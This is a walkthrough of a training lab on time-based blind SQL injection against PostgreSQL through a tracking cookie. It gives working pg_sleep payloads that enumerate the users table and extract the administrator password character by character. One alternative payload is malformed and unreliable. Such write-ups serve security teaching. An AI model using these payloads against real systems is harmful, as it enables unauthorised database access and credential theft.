# Lab-14 SQL Injection

## Blind SQL injection with time delays and information retrieval

### Problem

- This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

- The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

- The database contains a different table called `users`, with columns called `username and password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

- To solve the lab, log in as the `administrator` user. 

### Solution

- Intercept With burpsuite &  send the request to repeter. After that  Find that which type of database is this:`'||(Select pg_sleep(10))--`

- So it's a POSTgreSQL,Then we can check that there is a users table in it:`' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END from users)--'`

- After that administrator table is there or not we can check similarly:`' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END from users where username='administrator')--`

- After that we can enumurate the password:
```SQL
-- Both we can use
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND LENGTH(password)>1 LIMIT 1)--
' || (SELECT CASE WHEN (username='administrator' AND length(password) > 1) THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users)--
-- figuring The length of password using intruder
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND LENGTH(password)>1 LIMIT $1$)--
' || (SELECT CASE WHEN (username='administrator' AND length(password) > $1$) THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users)--
-- Password length is 20 Now we can find the password using substring
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND SUBSTRING(password,$1$,1)='$a$')--
' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1) THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users)--
-- 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 
-- o e w x i c p j 9 z  f  q  w  9  y  w  i  f  i  k
```

- Lab Solved!!!

